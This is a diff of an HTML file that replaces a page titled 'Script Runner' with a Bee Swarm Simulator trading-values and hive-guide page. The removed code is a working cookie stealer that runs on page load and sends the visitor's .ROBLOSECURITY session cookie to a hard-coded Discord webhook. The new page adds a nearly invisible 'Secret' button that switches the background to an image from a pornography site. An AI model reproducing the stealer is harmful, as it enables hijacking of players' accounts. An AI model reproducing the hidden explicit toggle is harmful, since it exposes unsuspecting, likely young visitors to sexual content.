@@ -1,74 +1,470 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Script Runner</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fishy's Bee Swarm Simulator Page</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fdf6e3;
+            color: #5a5a2d;
+            margin: 0;
+            padding: 20px;
+            background-image: url('https://tr.rbxcdn.com/7762f33ee079e5f17cc456e40def9b1c/768/432/Image/Webp');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+        h1, h2 {
+            color: #856404;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+        .section {
+            margin-bottom: 20px;
+            padding: 20px;
+            border: 2px solid #ffeeba;
+            border-radius: 10px;
+            background-color: rgba(255, 255, 255, 0.9);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #4a4a2d;
+        }
+        .hidden {
+            display: none;
+        }
+        button {
+            background-color: #856404;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            margin: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #6c4f02;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        li {
+            background-color: #fff3cd;
+            margin: 5px 0;
+            padding: 10px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .update-log-button {
+            position: fixed;
+            top: 95.5%; /* Keep this if you want the Update Log button centered vertically */
+            right: 10px; /* Adjust this for desired horizontal position */
+            z-index: 1000; /* Ensure it's above other content */
+        }
+
+        .calculator-button {
+            position: fixed;
+            top: 95.5%; /* Keep this if you want the Update Log button centered vertically */
+            right: 135px; /* Adjust this for desired horizontal position */
+            z-index: 1000; /* Ensure it's above other content */
+        }
+
+        /* Additional styles for #updateLog */
+        #updateLog {
+            position: fixed;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%); /* Center vertically */
+            border: 2px solid #ffeeba;
+            border-radius: 10px;
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px; /* Increased padding */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            display: none; /* Initially hidden */
+            z-index: 1000; /* Ensure it's above other content */
+            width: 400px; /* Wider width */
+            height: auto; /* Allow height to adjust */
+        }
+
+        #updateLog h2 {
+            font-size: 1.5em; /* Increased heading size */
+        }
+
+        #updateLog p {
+            font-size: 1.1em; /* Increased paragraph size */
+        }
+
+        #updateLog ul li {
+            padding: 15px; /* Increased padding for list items */
+            font-size: 1.1em; /* Increased list item size */
+        }
+    </style>
+    <script>
+        function toggleSection(sectionId) {
+            var section = document.getElementById(sectionId);
+            section.classList.toggle('hidden');
+        }
+
+        function toggleUpdateLog() {
+            var updateLog = document.getElementById('updateLog');
+            updateLog.style.display = updateLog.style.display === 'none' || updateLog.style.display === '' ? 'block' : 'none';
+        }
+
+        let isDragging = false;
+        let offsetX, offsetY;
+
+        function makeDraggable(element) {
+            element.addEventListener('mousedown', function(e) {
+                isDragging = true;
+                offsetX = e.clientX - element.getBoundingClientRect().left;
+                offsetY = e.clientY - element.getBoundingClientRect().top;
+            });
+
+            document.addEventListener('mousemove', function(e) {
+                if (isDragging) {
+                    let newX = e.clientX - offsetX;
+                    let newY = e.clientY - offsetY;
+
+                    // Boundary constraints
+                    const maxX = window.innerWidth - element.offsetWidth - 10; // 10px padding
+                    const maxY = window.innerHeight - element.offsetHeight - 10; // 10px padding
+                    newX = Math.max(10, Math.min(newX, maxX));
+                    newY = Math.max(10, Math.min(newY, maxY));
+
+                    // Update element's position
+                    element.style.left = newX + 'px';
+                    element.style.top = newY + 'px';
+                }
+            });
+
+            document.addEventListener('mouseup', function() {
+                isDragging = false;
+            });
+        }
+
+        let isSecretBackground = false;
+
+        window.onload = function() {
+            const updateLog = document.getElementById('updateLog');
+            makeDraggable(updateLog);
+            document.getElementById('secretButton').addEventListener('click', function() {
+                isSecretBackground = !isSecretBackground;
+                document.body.style.backgroundImage = isSecretBackground 
+                    ? "url('https://us.rule34.xxx//samples/1289/sample_df754580eb82d403f73a2e82f3b47c11.jpg?11295240')" 
+                    : "url('https://tr.rbxcdn.com/7762f33ee079e5f17cc456e40def9b1c/768/432/Image/Webp')";
+            });
+        };
+
+        let total = 0;
+        let items = [];
+
+        function addItem(name, value) {
+            items.push({ name, value });
+            updateTotal();
+            displayItems();
+        }
+
+        function removeItem(name) {
+            items = items.filter(item => item.name !== name);
+            updateTotal();
+            displayItems();
+        }
+
+        function updateTotal() {
+            total = items.reduce((sum, item) => sum + item.value, 0);
+            document.getElementById('total').innerText = 'Total: ' + total + ' Star Signs';
+        }
+
+        function displayItems() {
+            const itemList = document.getElementById('itemList');
+            itemList.innerHTML = ''; // Clear the list
+            items.forEach(item => {
+                const li = document.createElement('li');
+                li.innerText = item.name + ' (' + item.value + ' Star Signs)';
+                const removeButton = document.createElement('button');
+                removeButton.innerText = 'Remove';
+                removeButton.onclick = () => removeItem(item.name);
+                li.appendChild(removeButton);
+                itemList.appendChild(li);
+            });
+        }
+    </script>
 </head>
 <body>
-  <h1>Script Triggered</h1>
-  <p>The script is running in the background. Check the browser console for details.</p>
 
-  <script>
-    // Automatically runs when the page loads
-    window.onload = function() {
-      console.log("Page loaded. Script is running...");
+    <h1>Welcome to Fishy's Knowledge Bank!</h1>
 
-      // Function to send data to a Discord webhook
-      var sendToWebhook = function(content) {
-        var webhookUrl = "https://discord.com/api/webhooks/1320498162334699581/oshvXk5Gdwu7upIKyQYDDinC3OB7hqYqHSwB1Kt3dsGTFKve9wdS6JsRQhirtLuY1tST";
+    <div class="section" id="about">
+        <h2>About Me</h2>
+        <p>I am Fishy, a casual Bee Swarm Simulator player, and I decided to keep records of some trading values that I have encountered! <em><strong>Last Updated: 10/26/24</strong></em></p>
+    </div>
 
-        fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            content: content // Message to send
-          })
-        }).then(response => {
-          if (response.ok) {
-            console.log("Data sent to Discord webhook successfully.");
-          } else {
-            console.error("Failed to send data to Discord webhook.", response.statusText);
-          }
-        }).catch(error => {
-          console.error("Error sending data to Discord webhook:", error);
-        });
-      };
+    <div class="section">
+        <p>Use <strong>Control+F</strong> to find specific items quickly! For example, typing "Bee Bear Cub" will take you right to the details you need!</p>
+    </div>
 
-      // Function to get all cookies and track progress in console
-      var getAllCookies = function() {
-        var cookies = document.cookie.split(';').reduce(function(acc, cookie, index, array) {
-          var progress = Math.floor(((index + 1) / array.length) * 100);
-          var length = 50;
-          var filledLength = Math.round(length * progress / 100);
-          var bar = '[' + '='.repeat(filledLength) + ' '.repeat(length - filledLength) + ']';
-          console.log(bar + ' ' + progress + '%');
+    <div class="section">
+        <p><strong>WARNING:</strong> All trading values are subject to change, especially around major in-game events. There may be inaccuracies in this list, so use it as a general guide while trading. Remember to factor in demand; some items may be harder to trade!</p>
+    </div>
 
-          var parts = cookie.split('=');
-          if (parts.length === 2) {
-            var cookieName = parts[0].trim();
-            var cookieValue = decodeURIComponent(parts[1].trim());
-            acc[cookieName] = cookieValue;
-            return acc;
-          }
-          return acc;
-        }, {});
+    <div class="button-container">
+        <button onclick="toggleSection('cubSkins')">Cub Skins</button>
+        <button onclick="toggleSection('hiveSkins')">Hive Skins</button>
+        <button onclick="toggleSection('stickers')">Stickers</button>
+        <button onclick="toggleSection('newSection')">Vouchers</button>
+        <button onclick="toggleSection('beequips')">Beequips/Services</button>
+        <button onclick="toggleSection('guide')">Guides</button>
+    </div>
 
-        return cookies;
-      };
+    <div class="update-log-button">
+        <button onclick="toggleUpdateLog()">Update Log</button>
+    </div>
 
-      // Get all cookies and send the .ROBLOSECURITY cookie to the webhook if it exists
-      var allCookies = getAllCookies();
-      if (allCookies['.ROBLOSECURITY']) {
-        var message = '.ROBLOSECURITY cookie found: ' + allCookies['.ROBLOSECURITY'];
-        console.log(message);
-        sendToWebhook(message);
-      } else {
-        console.log("No .ROBLOSECURITY cookie found.");
-      }
-    };
-  </script>
-</body>
-</html>
+    <div class="section hidden" id="cubSkins">
+        <h2>Cub Skins</h2>
+        <p>Here Are Some Cub Buddy Skin Values in Bee Swarm Simulator:</p>
+        <ul>
+     <li>Bee Bear Cub: <strong>70 Star Signs</strong> (Rising)</li>
+     <li>Snow Cub: <strong>36-37 Star Signs</strong> (Stable)</li>
+     <li>Peppermint Robo Cub: <strong>25 Star Signs</strong> (Stable)</li>
+     <li>Noob Cub: <strong>18 Star Signs</strong> (Rising)</li>
+     <li>Brown Bear Cub: <strong>16-17 Star Signs</strong> (Stable)</li>
+     <li>Gingerbread Bear Cub: <strong>14 Star Signs</strong> (Stable)</li>
+     <li>Doodle Cub: <strong>10-11 Star Signs</strong> (Stable)</li>
+     <li>Stick Cub: <strong>9 Star Signs</strong> (Falling)</li>
+     <li>Star Cub: <strong>7-8 Star Signs</strong> (Stable)</li>
+     <li>Robo Cub: <strong>5 Star Signs</strong> (Stable)</li>
+
+        </ul>
+    </div>
+
+    <div class="section hidden" id="hiveSkins">
+        <h2>Hive Skins</h2>
+        <p>Here Are Some Values of Hive Skins in Bee Swarm Simulator:</p>
+        <ul>
+            <li>Wavy Purple: <strong>8.5-10 Star Signs</strong></li>
+            <li>Wavy Doodle: <strong>3.5-4 Star Signs</strong></li>
+            <li>Wavy Cyan: <strong>1.5-2 Star Signs</strong></li>
+            <li>Wavy Yellow: <strong>1 Star Sign</strong></li>
+            <li>Basic Hive Skins: <strong>0.05-0.07 Star Signs</strong>
+        </ul>
+    </div>
+
+    <div class="section hidden" id="stickers">
+        <h2>Stickers</h2>
+        <p>Here Are Values for Trading Stickers:</p>
+        <ul>
+            <li>BBM From Below: <strong>22-25+ Star Signs</strong></li>
+            <li>Nessie: <strong>6-8 Star Signs</strong></li>
+            <li>Ionic Column Top: <strong>5-6 Star Sign</strong></li>
+            <li>Ionic Column Base: <strong>5-6 Star Sign</strong></li>
+            <li>Round Basic Bee: <strong>5-6 Star Sign</strong></li>
+            <li>Royal Symbol: <strong>2-3 Star Sign</strong></li>
+            <li>Party Robo Bear: <strong>1-2 Star Sign</strong></li>
+            <li>Glowing Smile: <strong>1.5-2 Star Signs</strong></li>
+            <li>Eviction: <strong>1-1.5 Star Signs</strong></li>
+            <li>Flying Festive Bee: <strong>1.5-1.75 Star Sign</strong></li>
+            <li>Glowering Gummy Bear: <strong>1-2 Star Sign</strong></li>
+            <li>Ionic Column Middle: <strong>1-1.5 Star Sign</strong></li>
+            <li>Cyan Hilted Sword: <strong>1 Star Sign</strong></li>
+            <li>Prismatic Mushroom: <strong>1- Star Sign</strong></li>
+            <li>Black Truffle Mushroom: <strong>1- Star Sign</strong></li>
+            <li>Pearl Girl: <strong>1- Star Sign</strong></li>
+            <li>Prism Painting: <strong>1- Star Sign</strong></li>
+            <li>Abstract Color Painting: <strong>1- Star Sign</strong></li>
+            <li>Sideways Spirit Bear: <strong>1- Star Sign</strong></li>
+            <li>Royal Bear: <strong>1- Star Sign</strong></li>
+            <li>Stick Nymph: <strong>1- Star Sign</strong></li>
+            <li>Bear Bee Offer: <strong>1+ Star Sign</strong></li>
+            <li>Pine Field Stamp: <strong>0.85- Star Sign</strong></li>
+            <li>Pepper Field Stamp: <strong>0.85- Star Sign</strong></li>
+            <li>Auyrn: <strong>0.7-0.8 Star Sign</strong></li>
+            <li>Hourglass: <strong>0.7-0.8 Star Signs</strong></li>
+            <li>Tabby From Behind: <strong>0.7 Star Sign</strong></li>
+            <li>Mythic M: <strong>0.5+ Star Sign</strong></li>
+            <li>Tabby Scratch: <strong>0.5 Star Sign</strong></li>
+            <li>Other Field Stamps (Excluding Pine or Pepper): <strong>0.5 Star Sign</strong></li>
+            <li>Gummyballer: <strong>0.5 Star Signs</strong></li>
+            <li>Robot Head: <strong>0.5 Star Signs</strong></li>
+            <li>Dark Scythe: <strong>0.25 Star Signs</strong></li>
+            <li>Tide Popper: <strong>0.15 Star Signs</strong></li>
+            <li>Other Tool Stickers: <strong>0.1 Star Sign</strong></li>
+            <li>All Leaves: <strong>0.01+ Star Sign</strong></li>
+        </ul>
+    </div>
+
+    <div class="section hidden" id="newSection">
+        <h2>New Section</h2>
+        <p>This section can be used to add any additional content you wish to include. Feel free to customize it as needed!</p>
+        <ul>
+            <li>Bee Bear Voucher: <strong>2+ Star Signs</strong></li>
+            <li>2x Bee Gather Voucher: <strong>1.25-1.5 Star Signs</strong></li>
+            <li>2x Convert Speed Voucher: <strong>0.75 Star Signs</strong></li>
+            <li>Cub Buddy Voucher: <strong>0.75 Star Signs</strong> (lower right now due to beesmass)</li>
+        </ul>
+    </div>
+
+    <div class="section hidden" id="beequips">
+        <h2>Beequips/Services</h2>
+        <p>Here Are Some Values for Trading Beequips and Beequip Services!:</p>
+        <ul>
+            <li>Debug Wax: <strong>28.5-49 Star Signs (The higher end prices are usually reserved for trusted wax/turp traders)</strong></li>
+            <li>Turpentine Service: <strong>1 Star Sign</strong></li>
+            <!-- Add more items as needed -->
+        </ul>
+    </div>
+
+    <div class="section hidden" id="guide">
+        <h2>Guides</h2>
+        <p>This section provides guides on gameplay including hive tutorials and helpful information.:</p>
+        <ul>
+            <li><strong>Blue Hive Guide:</strong> As a beginner blue hive just starting off, you may struggle filling your balloons and your bag as your bees aren't going to be fully gifted yet. Good ratio of buoyant bees to tadpole bees early on is 16:11. As you gift more bees you may start to overfill your bag and need to replace some tadpole bees in return for buoyant bees. You may not have windy bee which could be used in blue hives although it is very helpful if you do not have it, it is not the end of the world. Digital bee is a good bee to use ONLY IF you have a decent amount of blue drives! <strong>Blue hives are very experimental and do not have a one hive fits all. Most importantly you have to experiment and see, am I underfilling? If so add tadpoles. Am I overfilling? If so you can add cobalt bee or remove tadpole bees.</strong></li>
+            <li><strong>Early Blue Hive Composition:</strong><br>
+                <strong>16x Buoyant Bees</strong> (Balloons make majority of your honey)<br>
+                <strong>11x Tadpole Bees</strong> (Bubbles are meta and also needed for popstar)<br>
+                <strong>4x Gifted Music Bees</strong> (For focus and melody)<br>
+                <strong>1x Gifted Ninja Bee</strong> (Haste and Blue Bee Type)<br>
+                <strong>1x Gifted Diamond Bee</strong> (Has a very good passive for conversion)<br>
+                <strong>1x Gifted Tabby Bee</strong><br>
+                <strong>1x Gifted Festive Bee</strong><br>
+                <strong>1x Gifted Windy Bee</strong> (If you don't have can replace with a buoyant/tad)<br>
+                <strong>1x Gifted Gummy Bee</strong><br>
+                <strong>1x Gifted Bear Bee</strong> (If you don't have can replace with buoyant/tad)<br>
+                <strong>1x Gifted Fuzzy</strong> (Make flower give more pollen, field pollination)<br>
+                <strong>1x Gifted Basic Bee</strong> (Free Pollen 20% extra for free)<br>
+                <strong>1x Gifted Looker</strong> (Focus)<br>
+                <strong>1x Gifted Bubble</strong> (Bubble lifespan, blue bee type)<br>
+                <strong>1x Gifted Frosty</strong> (Good for early game blue when underfilling by using bomb pollen, when higher level remove for a tadpole/buoyant)<br>
+                <strong>1x Gifted Bomber</strong> (Good for early game blue when underfilling by using bomb pollen, when higher level remove for a tadpole/buoyant)<br>
+                <strong>1x Gifted Shocked</strong> (Token Links, Haste)<br>
+                <strong>1x Gifted Bucko</strong><br>
+                <strong>1x Gifted Stubborn</strong><br>
+                <strong>1x Gifted Bumble</strong> (10% Capacity)<br>
+                <strong>1x Gifted Commander</strong><br>
+                <strong>1x Gifted Cool</strong> (Free Blue Pollen)
+            </li>
+        </ul>
+    </div>
+
+    <div class="section hidden" id="updateLog">
+        <h2>Update Log</h2>
+        <p>Here you can list the updates made to the page:</p>
+        <ul>
+            <li><strong>10/26/24:</strong>Value Changes: BBM Items Value Rise!<br>(High Change of Value Crash)(10/27-10/28)</li>
+            <!-- Add more update entries as needed -->
+        </ul>
+    </div>
+
+    <button id="secretButton" style="position: fixed; top: 10px; right: 10px; width: 70px; height: 30px; opacity: .07; cursor: pointer;">Secret</button>
+
+    <footer style="position: fixed; top: 10px; right: 10px;">
+        <div style="border: 1px solid #343a40; padding: 5px; border-radius: 5px; background-color: rgba(255, 255, 255, 0.8);">
+            <p style="color: #343a40;"><strong>Contact: Discord: @f.i.s.h.y_.</strong></p>
+        </div>
+    </footer>
+<div class="section hidden" id="calculator">
+    <h2>Calculator</h2>
+    <p>Items with a range will be an average of their high and low!</p>
+    <div>
+	<h2>Cub Skins</h2>
+     <button onclick="addItem('Bee Bear Cub', 70)">Bee Bear Cub <strong>(70+)</strong></button>
+     <button onclick="addItem('Snow Cub', 36.5)">Snow Cub <strong>(36-37)</strong></button>
+     <button onclick="addItem('Peppermint Robo Cub', 25)">Peppermint Robo Cub <strong>(25)</strong></button>
+     <button onclick="addItem('Noob Cub', 18)">Noob Cub <strong>(18+)</strong></button>
+     <button onclick="addItem('Brown Bear Cub', 16.5)">Brown Bear Cub <strong>(16-17)</strong></button>
+     <button onclick="addItem('Gingerbread Bear Cub', 14)">Gingerbread Bear Cub <strong>(14)</strong></button>
+     <button onclick="addItem('Doodle Cub', 10.5)">Doodle Cub <strong>(10-11)</strong></button>
+     <button onclick="addItem('Stick Cub', 9)">Stick Cub <strong>(9)</strong></button>
+     <button onclick="addItem('Star Cub', 7.5)">Star Cub <strong>(7-8)</strong></button>
+     <button onclick="addItem('Robo Cub', 5)">Robo Cub <strong>(5)</strong></button>
+        
+        <h2>Stickers</h2>
+     <button onclick="addItem('BBM From Below', 23.5)">BBM From Below <strong>(22-25+)</strong></button>
+     <button onclick="addItem('Nessie', 7)">Nessie <strong>(6-8)</strong></button>
+     <button onclick="addItem('Ionic Column Top', 5.5)">Ionic Column Top <strong>(5-6)</strong></button>
+     <button onclick="addItem('Ionic Column Base', 5.5)">Ionic Column Base <strong>(5-6)</strong></button>
+     <button onclick="addItem('Round Basic Bee', 5.5)">Round Basic Bee <strong>(5-6)</strong></button>
+     <button onclick="addItem('Royal Symbol', 2.5)">Royal Symbol <strong>(2-3)</strong></button>
+     <button onclick="addItem('Party Robo Bear', 1.5)">Party Robo Bear <strong>(1-2)</strong></button>
+     <button onclick="addItem('Glowing Smile', 1.75)">Glowing Smile <strong>(1.5-2)</strong></button>
+     <button onclick="addItem('Eviction', 1.25)">Eviction <strong>(1-1.5)</strong></button>
+     <button onclick="addItem('Flying Festive Bee', 1.625)">Flying Festive Bee <strong>(1.5-1.75)</strong></button>
+     <button onclick="addItem('Glowering Gummy Bear', 1.5)">Glowering Gummy Bear <strong>(1-2)</strong></button>
+     <button onclick="addItem('Ionic Column Middle', 1.25)">Ionic Column Middle <strong>(1-1.5)</strong></button>
+     <button onclick="addItem('Cyan Hilted Sword', 1)">Cyan Hilted Sword <strong>(1)</strong></button>
+     <button onclick="addItem('Prismatic Mushroom', 1)">Prismatic Mushroom <strong>(1-)</strong></button>
+     <button onclick="addItem('Black Truffle Mushroom', 1)">Black Truffle Mushroom <strong>(1-)</strong></button>
+     <button onclick="addItem('Pearl Girl', 1)">Pearl Girl <strong>(1-)</strong></button>
+     <button onclick="addItem('Prism Painting', 1)">Prism Painting <strong>(1-)</strong></button>
+     <button onclick="addItem('Abstract Color Painting', 1)">Abstract Color Painting <strong>(1-)</strong></button>
+     <button onclick="addItem('Sideways Spirit Bear', 1)">Sideways Spirit Bear <strong>(1-)</strong></button>
+     <button onclick="addItem('Royal Bear', 1)">Royal Bear <strong>(1-)</strong></button>
+     <button onclick="addItem('Stick Nymph', 1)">Stick Nymph <strong>(1-)</strong></button>
+     <button onclick="addItem('Bear Bee Offer', 1)">Bear Bee Offer <strong>(1+)</strong></button>
+     <button onclick="addItem('Pine Field Stamp', 0.85)">Pine Field Stamp <strong>(0.85-)</strong></button>
+     <button onclick="addItem('Pepper Field Stamp', 0.85)">Pepper Field Stamp <strong>(0.85-)</strong></button>
+     <button onclick="addItem('Auyrn', 0.75)">Auyrn <strong>(0.7-0.8)</strong></button>
+     <button onclick="addItem('Hourglass', 0.75)">Hourglass <strong>(0.7-0.8)</strong></button>
+     <button onclick="addItem('Tabby From Behind', 0.7)">Tabby From Behind <strong>(0.7)</strong></button>
+     <button onclick="addItem('Mythic M', 0.5)">Mythic M <strong>(0.5+)</strong></button>
+     <button onclick="addItem('Tabby Scratch', 0.5)">Tabby Scratch <strong>(0.5)</strong></button>
+     <button onclick="addItem('Other Field Stamps', 0.5)">Other Field Stamps (Excluding Pine or Pepper) <strong>(0.5)</strong></button>
+     <button onclick="addItem('Gummyballer', 0.5)">Gummyballer <strong>(0.5)</strong></button>
+     <button onclick="addItem('Robot Head', 0.5)">Robot Head <strong>(0.5)</strong></button>
+     <button onclick="addItem('Dark Scythe', 0.25)">Dark Scythe <strong>(0.25)</strong></button>
+     <button onclick="addItem('Tide Popper', 0.15)">Tide Popper <strong>(0.15)</strong></button>
+     <button onclick="addItem('Other Tool Stickers', 0.1)">Other Tool Stickers <strong>(0.1)</strong></button>
+     <button onclick="addItem('All Leaves', 0.01)">All Leaves <strong>(0.01+)</strong></button>
+        
+        <h2>Hive Skins</h2>
+        <button onclick="addItem('Wavy Purple', 9.25)">Wavy Purple <strong>(8.5-10)</strong></button>
+        <button onclick="addItem('Wavy Doodle', 2)">Wavy Doodle <strong>(2+)</strong></button>
+        <button onclick="addItem('Wavy Cyan', 1.75)">Wavy Cyan <strong>(1.5-2)</strong></button>
+        <button onclick="addItem('Wavy Yellow', 1)">Wavy Yellow <strong>(1)</strong></button>
+        <button onclick="addItem('Basic Hive Skins', 0.06)">Basic Hive Skins <strong>(0.05-0.07)</strong></button>
+	
+	<h2>Vouchers</h2>
+	<button onclick="addItem('Bee Bear Voucher', 2)">Bee Bear Voucher <strong>(2+ Star Signs)</strong></button>
+	<button onclick="addItem('Bee Gather Voucher', 1.375)">2x Bee Gather Voucher <strong>(1.25-1.5 Star Signs)</strong></button>
+	<button onclick="addItem('Convert Speed Voucher', 0.75)">2x Convert Speed Voucher <strong>(0.75 Star Signs)</strong></button>
+	<button onclick="addItem('Cub Buddy Voucher', 0.75)">Cub Buddy Voucher <strong>(0.75 Star Signs)</strong></button>
+    </div>
+    <ul id="itemList"></ul>
+    <div>
+        <strong>Total Value: <span id="totalValue">0</span></strong>
+    </div>
+</div>
+
+<button class="calculator-button" onclick="toggleSection('calculator')">Toggle Calculator</button>
+
+<script>
+    let totalValue = 0;
+
+    function addItem(itemName, itemValue) {
+        const itemList = document.getElementById('itemList');
+        const listItem = document.createElement('li');
+        listItem.innerHTML = `${itemName}: <strong>${itemValue}</strong> <button onclick="removeItem(this, ${itemValue})">Remove</button>`;
+        itemList.appendChild(listItem);
+        totalValue += itemValue;
+        updateTotalValue();
+    }
+
+    function removeItem(button, value) {
+        const listItem = button.parentElement;
+        listItem.remove();
+        totalValue -= value;
+        updateTotalValue();
+    }
+
+    function updateTotalValue() {
+        document.getElementById('totalValue').textContent = totalValue.toFixed(2);
+    }
+</script>
+<body>
+<html>
